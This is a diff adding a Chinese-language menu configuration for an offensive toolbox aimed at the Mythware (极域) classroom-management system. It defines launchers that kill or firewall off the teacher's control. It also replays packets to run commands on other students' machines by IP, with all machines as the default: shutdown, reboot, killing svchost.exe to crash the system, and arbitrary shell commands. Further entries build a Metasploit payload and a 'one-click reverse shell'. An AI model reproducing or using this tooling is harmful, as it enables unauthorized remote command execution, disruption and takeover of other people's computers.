@@ -1,0 +1,207 @@
+﻿; ====================================================
+;     powered        __               __      
+;         by    ____/ /  ____ _  ____/ /  ___ 
+;              / __  /  / __ `/ / __  /  / _ \
+;             / /_/ /  / /_/ / / /_/ /  /  __/
+;             \__,_/   \__,_/  \__,_/   \___/
+;
+; ====================================================
+
+[工具:安装与部署]
+Name=安装与部署
+Description=详情见帮助文档
+
+[工具:安装与部署>工具安装]
+Name=工具安装
+Path=install.bat
+Description=在指定位置安装工具箱 (无需再签eula)
+RunAsAdmin=1
+Wait=1
+
+[工具:安装与部署>安装部署]
+Name=安装部署
+Path=install_setup.bat
+Description=在移动存储设备上安装快捷部署程序
+RunAsAdmin=1
+Wait=1
+
+[工具:安装与部署>本机部署]
+Name=本机部署
+Path=setup.bat
+Description=!注意! 此工具会修改系统文件与配置, 请谨慎操作
+RunAsAdmin=1
+Wait=1
+
+[工具:极域小工具]
+Name=极域小工具
+Description=一些极域相关功能
+
+[工具:极域小工具>脱控功能]
+Name=脱控功能
+Description=脱离极域控制
+
+[工具:极域小工具>脱控功能>关闭极域]
+Name=关闭极域
+Path=break.bat
+Description=通过直接结束极域进程以实现脱控
+RunAsAdmin=1
+Wait=1
+
+[工具:极域小工具>脱控功能>一键脱控]
+Name=一键脱控
+Path=bin\udpatk.exe
+Args=-e break
+Description=通过修改防火墙策略以实现脱控
+RunAsAdmin=1
+Wait=1
+
+[工具:极域小工具>脱控功能>恢复极域]
+Name=恢复极域
+Path=bin\udpatk.exe
+Args=-e continue
+Description=恢复防火墙配置
+RunAsAdmin=1
+Wait=1
+
+[工具:极域小工具>重放攻击]
+Name=重放攻击
+Description=未授权使用后果自负
+
+[工具:极域小工具>重放攻击>快捷攻击]
+Name=快捷攻击
+Description=关机/重启/蓝屏打击
+
+[工具:极域小工具>重放攻击>快捷攻击>关机打击]
+Name=关机打击
+Path=bin/udpatk.exe
+Args=-c "cmd /c shutdown -s -t 0" -ip {ip}
+Description=关机打击 (可指定IP, 默认全员)
+Prompts=ip:指定ip地址 [默认全员]
+RunAsAdmin=1
+NewConsole=1
+HideWindow=1
+
+[工具:极域小工具>重放攻击>快捷攻击>重启打击]
+Name=重启打击
+Path=bin/udpatk.exe
+Args=-c "cmd /c shutdown -r -t 0" -ip {ip}
+Description=重启打击 (可指定IP, 默认全员)
+Prompts=ip:指定ip地址 [默认全员]
+RunAsAdmin=1
+NewConsole=1
+HideWindow=1
+
+[工具:极域小工具>重放攻击>快捷攻击>蓝屏打击]
+Name=蓝屏打击
+Path=bin/udpatk.exe
+Args=-c "cmd /c taskkill /F /im svchost.exe" -ip {ip}
+Description=蓝屏打击 (可指定IP, 默认全员)
+Prompts=ip:指定ip地址 [默认全员]
+RunAsAdmin=1
+NewConsole=1
+HideWindow=1
+
+[工具:极域小工具>重放攻击>发送消息]
+Name=发送消息
+Path=bin/udpatk.exe
+Args=-msg "{msg}" -ip {ip}
+Description=发送极域消息
+Prompts=msg:消息;ip:指定ip地址 [默认全员]
+RunAsAdmin=1
+NewConsole=1
+HideWindow=1
+
+[工具:极域小工具>重放攻击>弹窗消息]
+Name=弹窗消息
+Path=bin/udpatk.exe
+Args=-c "cmd /c start cmd /k echo {msg}" -ip {ip}
+Description=发送 cmd 弹窗消息
+Prompts=msg:消息;ip:指定ip地址 [默认全员]
+RunAsAdmin=1
+NewConsole=1
+HideWindow=1
+
+[工具:极域小工具>重放攻击>发送命令]
+Name=发送命令
+Path=bin/udpatk.exe
+Args=-c "cmd /c {cmd}" -ip {ip}
+Description=连续发送间隔小于 20 秒可能无效
+Prompts=cmd:命令;ip:指定ip地址 [默认全员]
+RunAsAdmin=1
+NewConsole=1
+HideWindow=1
+
+[工具:极域小工具>重放攻击>布控功能]
+Name=布控功能
+Description=请自行安装 msf
+
+[工具:极域小工具>重放攻击>布控功能>生成被控]
+Name=生成被控
+Path=shell/gen.bat
+WorkDir=shell
+Description=注意检查 msf 安装及环境变量配置
+RunAsAdmin=1
+NewConsole=1
+
+[工具:极域小工具>重放攻击>布控功能>开启控制]
+Name=开启控制
+Path=server/server.bat
+Description=注意检查 msf 安装及环境变量配置
+RunAsAdmin=1
+NewConsole=1
+
+[工具:极域小工具>重放攻击>布控功能>一键布控]
+Name=一键布控
+Path=hack.bat
+Description=一键完成反弹 shell
+RunAsAdmin=1
+NewConsole=1
+
+[工具:极域小工具>原版程序]
+Name=原版程序
+Path=C:\Windows\System32\cmd.exe
+Args=/k udpatk.exe -h | more
+WorkDir=bin
+Description=开启原版 udpatk.exe
+RunAsAdmin=1
+NewConsole=1
+
+[工具:系统小工具]
+Name=系统小工具
+Description=一些快捷系统操作
+
+[工具:系统小工具>命令提示符]
+Name=命令提示符
+Path=C:\Windows\System32\cmd.exe
+WorkDir=C:\Windows\System32
+Description=以管理员身份开启 cmd.exe
+RunAsAdmin=1
+NewConsole=1
+
+[工具:系统小工具>共享文件夹]
+Name=共享文件夹
+Path=bin/miniweb.exe
+Args=-p {port} -d {dir}
+WorkDir=shell
+Description=开启 web 文件共享
+Prompts=port:web 端口:80;dir:共享目录:.\
+RunAsAdmin=1
+NewConsole=1
+
+[工具:神秘小工具]
+Name=神秘小工具
+Description=好玩的~ (?)
+
+[工具:神秘小工具>神秘扫盘~]
+Name=神秘扫盘~
+Path=XD.bat
+Description=我先来简单扫个盘~ (展示豪度 XD)
+RunAsAdmin=1
+NewConsole=1
+
+[工具:神秘小工具>神秘彩虹~]
+Name=神秘彩虹~
+Path=rainbow~.bat
+Description=彩色文本=彩虹, 嗯对 (￣︶￣)
+RunAsAdmin=1
+NewConsole=1
